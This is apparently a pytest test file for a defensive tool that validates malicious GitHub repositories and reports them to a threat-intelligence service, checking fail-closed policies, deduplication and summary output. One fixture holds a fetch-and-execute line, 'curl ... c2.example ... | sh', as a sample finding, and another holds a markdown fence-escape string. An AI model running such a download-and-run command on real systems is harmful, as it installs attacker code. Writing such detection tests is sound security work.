"""Safety tests for unattended OSM submission."""

from __future__ import annotations

import pytest

from git_warden import osm_automation as auto


class _Response:
    def __init__(self, status_code: int, payload=None):
        self.status_code = status_code
        self._payload = payload if payload is not None else {}
        self.content = b"{}"

    def json(self):
        return self._payload


def test_resource_key_normalizes_repo_variants():
    assert auto._resource_key("https://github.com/Owner/Repo/") == "owner/repo"
    assert auto._resource_key("github.com/owner/repo?x=1") == "owner/repo"


def test_full_history_precheck_fails_closed_on_http_error(monkeypatch):
    monkeypatch.setattr(auto.config, "OSM_API_KEY", "osm_test")
    monkeypatch.setattr(
        auto.requests,
        "get",
        lambda *a, **k: _Response(503),
    )
    with pytest.raises(auto.OSMPrecheckError):
        auto._search_full_history("https://github.com/evil/dropper")


def test_existing_repo_matches_any_canonical_spelling(monkeypatch):
    monkeypatch.setattr(
        auto,
        "_search_full_history",
        lambda term: (
            [{"resource_identifier": "https://github.com/Evil/Dropper/", "id": "t1"}]
            if term.endswith("evil/dropper/")
            else []
        ),
    )
    hit = auto._existing_repo("evil/dropper")
    assert hit and hit["id"] == "t1"

def test_versioned_policy_keeps_all_fail_closed_guards():
    policy = auto.load_policy()
    assert policy["fail_closed"] is True
    assert policy["required_confidence"] == "auto"
    assert policy["require_docker_sandbox"] is True
    assert policy["require_positive_liveness"] is True
    assert policy["osm_full_history_prechecks"] >= 2
    assert policy["require_shared_intel_dedup"] is True
    assert policy["submit_domains"] is False
    assert policy["pace_seconds"] >= 6


def test_policy_rejects_weakened_precheck_count():
    policy = auto.load_policy().copy()
    policy["osm_full_history_prechecks"] = 1
    with pytest.raises(RuntimeError):
        auto._validate_policy(policy)


def test_policy_rejects_unattended_domain_submission():
    policy = auto.load_policy().copy()
    policy["submit_domains"] = True
    with pytest.raises(RuntimeError):
        auto._validate_policy(policy)

def test_policy_rejects_disabled_shared_intel_dedup():
    policy = auto.load_policy().copy()
    policy["require_shared_intel_dedup"] = False
    with pytest.raises(RuntimeError):
        auto._validate_policy(policy)


def test_second_osm_precheck_closes_race_before_post(monkeypatch):
    row = {"full_name": "evil/dropper"}
    policy = auto.load_policy().copy()
    checks = iter([None, {"id": "race", "status": "pending"}])

    monkeypatch.setattr(auto, "load_policy", lambda: policy)
    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0: [row])
    monkeypatch.setattr(auto.bus, "is_submitted", lambda kind, value: False)
    monkeypatch.setattr(auto, "_existing_repo", lambda name: next(checks))
    monkeypatch.setattr(auto, "_deep_validate", lambda name: (True, "AUTO", None))
    monkeypatch.setattr(auto, "repo_payload_live", lambda finding: True)
    monkeypatch.setattr(auto, "submit_threat", lambda report: pytest.fail("must not POST"))

    sent = auto.run(object(), limit=1, pace=0)
    assert sent == 0


# --- "Validated malicious repo" markdown summary ------------------------------


class _Finding:
    def __init__(self, file, line, snippet):
        self.file, self.line, self.snippet = file, line, snippet
        self.category, self.rule = "delivery", "curl_pipe_sh"


class _Tier2:
    commit_sha = "0123abcd"
    scanners = {"guarddog": "flagged", "semgrep": "clean"}

    def __init__(self, findings):
        self.confirming_findings = findings


_POLICY = auto.load_policy()


class _DB:
    def dprk_infra_hosts(self, exclude=None):
        return set()


def _validated_run(monkeypatch, tmp_path, *, dry_run, submit=None):
    row = {"full_name": "evil/dropper", "score": 91, "detection_method": "code_search"}
    finding = _Finding("install.sh", 7, "curl -s http://c2.example/x | sh\n```\n# [x](http://a)")
    report = {"severity_level": "critical", "tags": ["dropper", "dprk"],
              "verified_iocs": "c2.example", "threat_description": "Drops a payload."}
    marks = []
    monkeypatch.setattr(auto, "load_policy", lambda: _POLICY)
    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0: [row])
    monkeypatch.setattr(auto.bus, "is_submitted", lambda kind, value: False)
    monkeypatch.setattr(auto.bus, "mark_submitted", lambda *a, **k: marks.append(("bus", a)))
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(auto, "_deep_validate",
                        lambda name: (True, "AUTO", _Tier2([finding])))
    monkeypatch.setattr(auto, "repo_payload_live", lambda finding: True)
    monkeypatch.setattr(auto, "build_report", lambda row, **k: report)
    monkeypatch.setattr(auto, "campaign_context", lambda db, row: "")
    monkeypatch.setattr(auto, "mark_osm_submitted",
                        lambda db, name, tid: marks.append(("claim", name, tid)))
    monkeypatch.setattr(auto, "unmark_osm_submitted",
                        lambda db, name: marks.append(("unclaim", name)))
    monkeypatch.setattr(
        auto, "submit_threat",
        submit or (lambda report: pytest.fail("validate-only run must not POST")))
    out = tmp_path / "summary.md"
    sent = auto.run(_DB(), limit=1, pace=0, dry_run=dry_run, summary_path=out)
    return sent, out.read_text(encoding="utf-8"), marks


def test_dry_run_reports_validated_repo_not_yet_in_osm(monkeypatch, tmp_path):
    sent, md, marks = _validated_run(monkeypatch, tmp_path, dry_run=True)
    assert sent == 0
    assert marks == []  # no claim, no shared-intel mark, no POST
    assert "### Validated malicious repo: `evil/dropper`" in md
    assert "NOT YET REPORTED TO OSM" in md
    assert "https://github.com/evil/dropper" in md
    assert "https://github.com/evil/dropper/blob/0123abcd/install.sh#L7" in md
    assert "| Severity | critical |" in md
    assert "guarddog" in md
    assert "validate-only" in md


def test_submit_run_records_threat_id_in_summary(monkeypatch, tmp_path):
    sent, md, marks = _validated_run(
        monkeypatch, tmp_path, dry_run=False, submit=lambda report: {"threat_id": "t-42"})
    assert sent == 1
    assert ("claim", "evil/dropper", "t-42") in marks
    assert "submitted** as `t-42`" in md
    assert "NOT YET REPORTED" not in md


def test_failed_post_is_summarised_as_not_reported(monkeypatch, tmp_path):
    def boom(report):
        raise RuntimeError("HTTP 500")

    with pytest.raises(RuntimeError):
        _validated_run(monkeypatch, tmp_path, dry_run=False, submit=boom)
    md = (tmp_path / "summary.md").read_text(encoding="utf-8")
    assert "NOT REPORTED TO OSM" in md and "POST failed" in md


def test_untrusted_snippet_cannot_escape_its_code_fence():
    fenced = auto._fence("a\n```\n[click](http://evil)\n````")
    assert fenced.startswith("`````text\n") and fenced.endswith("\n`````")


def test_skipped_candidates_are_listed_in_summary(monkeypatch, tmp_path):
    monkeypatch.setattr(auto, "gold_for_submission",
                        lambda db, limit=0: [{"full_name": "gone/repo"}])
    monkeypatch.setattr(auto.bus, "is_submitted", lambda kind, value: False)
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(auto, "_deep_validate",
                        lambda name: (False, "sandbox scan produced no result", None))
    out = tmp_path / "summary.md"
    auto.run(object(), limit=1, pace=0, dry_run=True, summary_path=out)
    md = out.read_text(encoding="utf-8")
    assert "Validated malicious repos: **0**" in md
    assert "| `gone/repo` | deep validation failed closed: sandbox scan produced no result |" in md
